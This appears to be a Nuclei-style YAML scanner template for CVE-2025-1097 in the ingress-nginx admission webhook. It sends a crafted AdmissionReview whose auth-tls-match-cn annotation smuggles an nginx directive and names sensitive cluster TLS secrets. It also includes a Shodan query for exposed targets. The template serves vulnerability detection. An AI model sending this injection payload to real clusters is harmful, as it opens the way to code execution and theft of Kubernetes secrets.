http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - AdmissionReview
    - could not load the shared library
  payloads:
    secrets:
    - kube-system/konnectivity-certs
    - kube-system/azure-wi-webhook-server-cert
    - kube-system/aws-load-balancer-webhook-tls
    - kube-system/hubble-server-certs
    - kube-system/cilium-ca
    - calico-system/node-certs
    - cert-manager/cert-manager-webhook-ca
    - linkerd/linkerd-policy-validator-k8s-tls
    - linkerd/linkerd-proxy-injector-k8s-tls
    - linkerd/linkerd-sp-validator-k8s-tls
  raw:
  - 'POST / HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/json


    {"kind":"AdmissionReview","apiVersion":"admission.k8s.io/v1","request":{"uid":"{{string}}","kind":{"group":"networking.k8s.io","version":"v1","kind":"Ingress"},"resource":{"group":"networking.k8s.io","version":"v1","resource":"ingresses"},"namespace":"default","operation":"CREATE","userInfo":{"username":"admin"},"object":{"apiVersion":"networking.k8s.io/v1","kind":"Ingress","metadata":{"name":"{{string}}-auth-tls","namespace":"default","annotations":{"nginx.ingress.kubernetes.io/auth-tls-match-cn":"CN=abc
    #(\n){}\n }}\nssl_engine /aaa;\n#","nginx.ingress.kubernetes.io/auth-tls-secret":"{{secrets}}"}},"spec":{"ingressClassName":"nginx","rules":[{"host":"test.local","http":{"paths":[{"path":"/","pathType":"Prefix","backend":{"service":{"name":"dummy","port":{"number":80}}}}]}}]}}}}

    '
  stop-at-first-match: true
id: CVE-2025-1097
info:
  author: iamnoooob,rootxharsh,pdresearch
  classification:
    cve-id: CVE-2025-1097
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 8.8
    cwe-id: CWE-20
    epss-percentile: 0.93947
    epss-score: 0.13418
  description: 'A security issue was discovered in  ingress-nginx https-//github.com/kubernetes/ingress-nginx  where
    the `auth-tls-match-cn` Ingress annotation can be used to inject configuration
    into nginx. This can lead to arbitrary code execution in the context of the ingress-nginx
    controller, and disclosure of Secrets accessible to the controller. (Note that
    in the default installation, the controller can access all Secrets cluster-wide.)

    '
  impact: 'Authenticated users with Ingress creation permissions can inject nginx
    configuration through the auth-tls-match-cn annotation, leading to arbitrary code
    execution in the ingress-nginx controller context and disclosure of all Kubernetes
    Secrets cluster-wide.

    '
  metadata:
    max-request: 1
    shodan-query: ssl:"ingress-nginx" port:8443
    verified: true
  name: Ingress-Nginx Controller - Configuration Injection via Unsanitized `auth-tls-match-cn`
    Annotation
  reference:
  - https://github.com/kubernetes/kubernetes/issues/131007
  - https://www.wiz.io/blog/ingress-nginx-kubernetes-vulnerabilities
  - https://nvd.nist.gov/vuln/detail/CVE-2025-1097
  remediation: 'Upgrade to the patched version of ingress-nginx that properly sanitizes
    the auth-tls-match-cn annotation.

    '
  severity: high
  tags: cve,cve2025,cloud,devops,kubernetes,ingress,nginx,k8s,vuln
variables:
  string: '{{to_lower(''{{randstr}}'')}}'
